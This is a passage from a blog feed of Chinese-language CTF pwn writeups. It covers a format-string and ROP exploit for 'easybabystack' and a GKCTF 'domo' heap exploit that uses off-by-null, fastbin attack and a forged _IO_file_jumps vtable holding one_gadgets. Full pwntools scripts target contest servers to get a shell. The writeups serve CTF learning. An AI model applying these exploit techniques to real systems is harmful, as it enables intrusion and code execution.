leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">        libc.address=leak-0x7fcb248f9690+0x7fcb2488a000</span></span><br><span class="line"><span class="string">        info("leak",leak)</span></span><br><span class="line"><span class="string">        info("libc",libc.address)</span></span><br><span class="line"><span class="string">        sleep(1)</span></span><br><span class="line"><span class="string">        p.recv()</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easybabystack"><a href="#easybabystack" class="headerlink" title="easybabystack"></a>easybabystack</h2><p>这题比赛的时候也没做出来，参考fmyy师傅的题解</p><p> 格式化字符串中 *$连用表示取对应偏移位置的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">p= process(<span class="string">'./main'</span>)</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10001</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'username:'</span>,<span class="string">'%*18$d%5$n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x401512")</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x401733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401731</span></span><br><span class="line">binsh  =<span class="number">0x404090</span></span><br><span class="line">system = <span class="number">0x401110</span></span><br><span class="line">read_got = <span class="number">0x404038</span></span><br><span class="line">gadget_I = <span class="number">0x40172A</span></span><br><span class="line">gadget_Ii = <span class="number">0x401710</span></span><br><span class="line">payload  = <span class="string">'U'</span>*<span class="number">0x118</span></span><br><span class="line">payload += p64(gadget_I)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(gadget_Ii)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">p.recvuntil(<span class="string">'message'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;盲打1-盲打2&quot;&gt;&lt;a href=&quot;#盲打1-盲打2&quot; class=&quot;headerlink&quot; title=&quot;盲打1 盲打2&quot;&gt;&lt;/a&gt;盲打1 盲打2&lt;/h2&gt;&lt;p&gt;都是一个c语言解释器，但是不能用&lt;code&gt;()&lt;/code&gt;来写c语言，也就是不能调用函数，可以用
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/05/24/GKCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/05/24/GKCTF-pwn-writeup/</id>
    <published>2020-05-24T10:04:51.000Z</published>
    <updated>2020-05-28T01:26:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="domo"><a href="#domo" class="headerlink" title="domo"></a>domo</h2><p>一道 domo日了一天，最后还是做出来，还是很高兴的</p><p><code>off-by-null</code>漏洞，edit功能有任意地址一字节写入，可以用来伪造堆块的size，<code>malloc_fook</code>和<code>free_hook</code>程序做有限制，然后又有<code>sanbox</code>。但是是在main函数结束的时候才生效的，只要在while循环里面调用<code>onegadget</code>，还是能反弹shell的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x0000000a  <span class="keyword">if</span> (A == mprotect) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0xffffd8b6  <span class="keyword">if</span> (A == 0xffffd8b6) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>一开始的思路是想用 <code>environ</code>来泄露 <code>stack_addr</code>然后再申请堆块到栈上用<code>orw</code>的方式来做</p><p>然后费了好大的劲，泄露出stack的地址了，stack上没有合适的size而且还有麻烦的<code>canary</code></p><p>最后选择伪造 <code>_IO_2_1_stdin_</code>的<code>vtable</code>为heap地址，heap里面存放着<code>onegadget</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdin</span><br><span class="line">$1 = (struct _IO_FILE *) 0x7f991f79b8e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus *) 0x7f991f79b8e0</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539512, </span><br><span class="line">    _IO_read_ptr = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_read_end = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_read_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_end = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x557376e65010 &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 16, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x7f991f79d790 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7f991f79b9c0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 113, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f991f79a6e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上是伪造 <code>_IO_file_jumps</code>结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_file_jumps</span><br><span class="line">$3 = &#123;</span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x7f991f4509c0 &lt;_IO_new_file_finish&gt;, </span><br><span class="line">  __overflow = 0x7f991f451730 &lt;_IO_new_file_overflow&gt;, </span><br><span class="line">  __underflow = 0x7f991f4514a0 &lt;_IO_new_file_underflow&gt;, </span><br><span class="line">  __uflow = 0x7f991f452600 &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = 0x7f991f453980 &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class="line">  __xsputn = 0x7f991f4501e0 &lt;_IO_new_file_xsputn&gt;, </span><br><span class="line">  __xsgetn = 0x7f991f44fec0 &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class="line">  __seekoff = 0x7f991f44f4c0 &lt;_IO_new_file_seekoff&gt;, </span><br><span class="line">  __seekpos = 0x7f991f452a00 &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = 0x7f991f44f430 &lt;_IO_new_file_setbuf&gt;, </span><br><span class="line">  __sync = 0x7f991f44f370 &lt;_IO_new_file_sync&gt;, </span><br><span class="line">  __doallocate = 0x7f991f444180 &lt;__GI__IO_file_doallocate&gt;, </span><br><span class="line">  __read = 0x7f991f4501a0 &lt;__GI__IO_file_read&gt;, </span><br><span class="line">  __write = 0x7f991f44fb70 &lt;_IO_new_file_write&gt;, </span><br><span class="line">  __seek = 0x7f991f44f970 &lt;__GI__IO_file_seek&gt;, </span><br><span class="line">  __close = 0x7f991f44f340 &lt;__GI__IO_file_close&gt;, </span><br><span class="line">  __stat = 0x7f991f44fb60 &lt;__GI__IO_file_stat&gt;, </span><br><span class="line">  __showmanyc = 0x7f991f453af0 &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = 0x7f991f453b00 &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>先利用<code>unsortedbin_attack</code>泄露出libc基址和heap地址</p><p>然后 <code>off-by-null</code>溢出修改下一个堆块的 size 为 <code>\x00</code>使得他被修改为释放过的</p><p>通过布局，unlink使得堆块向前合并，造成堆块重叠，<code>fastbin_attack</code> 打<code>vtable</code>,需要用edit功能提前伪造size。</p><p><code>_IO_file_jumps</code>里面全放<code>onegadget</code>然后劫持程序执行流 ，生效的是<code>__xsputn</code>这里的<code>onegadget</code></p><p>看下puts函数的具体实现</p><p>代码来自：<a href="https://code.woboq.org/userspace/glibc/" target="_blank" rel="noopener">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/libio/" target="_blank" rel="noopener">libio</a>/<a href="https://code.woboq.org/userspace/glibc/libio/ioputs.c.html" target="_blank" rel="noopener">ioputs.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  <span class="keyword">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里实际上是调用了<code>_IO_sputn</code>这个函数，当然这个<code>_IO_sputn</code>实际上就是一个宏，调用了<code>_IO_2_1_stdout_</code>的vtable中的<code>__xsputn</code>，也就是<code>_IO_new_file_xsputn</code>函数。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">environ=libc.sym[<span class="string">"environ"</span>]</span><br><span class="line">_IO_list_all=libc.address+<span class="number">0x7f97b2172520</span><span class="number">-0x7f97b1dad000</span></span><br><span class="line">io_stdin_vtable=libc.address+<span class="number">0x7f07aec479b0</span><span class="number">-0x7f07ae883000</span></span><br><span class="line">info(<span class="string">"environ"</span>,environ)</span><br><span class="line">info(<span class="string">"io_stdin_vtable"</span>,io_stdin_vtable)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + fake vtable-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(io_stdin_vtable<span class="number">-0x20</span>)) <span class="comment">#1</span></span><br><span class="line">edit(io_stdin_vtable<span class="number">-0x18</span>,<span class="string">"\x71"</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one[<span class="number">2</span>]+libc.address)*<span class="number">19</span>+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">add(<span class="number">0x100</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0xffffffff</span>)+<span class="string">"\x00"</span>*<span class="number">0x10</span>+p64(heap+<span class="number">0x140</span>)) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">free(0)</span></span><br><span class="line"><span class="string">add(0x120,'\x12'*0x100+p64(0x110)+p64(0x70)+p64(io_sdtout-0x43)) #1</span></span><br><span class="line"><span class="string">add(0x68,"\x17"*0x10) #</span></span><br><span class="line"><span class="string">payload='\x01'*0x33+p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+0x8)+ p64(environ+0x8)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x68,payload) #2</span></span><br><span class="line"><span class="string">dbg()</span></span><br><span class="line"><span class="string">leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">rbp=leak-0x7ffc34284dd8+0x7ffc34284ce0</span></span><br><span class="line"><span class="string">info("leak",leak)</span></span><br><span class="line"><span class="string">info("rbp",rbp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h3><p>赛后看了官方的writeup，预期解跟我刚开始的思路差不多，只不过攻击方式不同</p><p>他是先修改<code>_IO_2_1_stdout_</code>来实现泄露stack地址，</p><p>接着改写 <code>_IO_2_1_stdin_</code>来实现向stack上写ROP链</p><p>有一些细节，需要注意到。修改 <code>_IO_2_1_stdout_</code>泄露出栈地址后，<code>puts</code>函数输出的字符不会加换行符了</p><p>具体原因还不清楚，有知道的师傅可以交流一波</p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 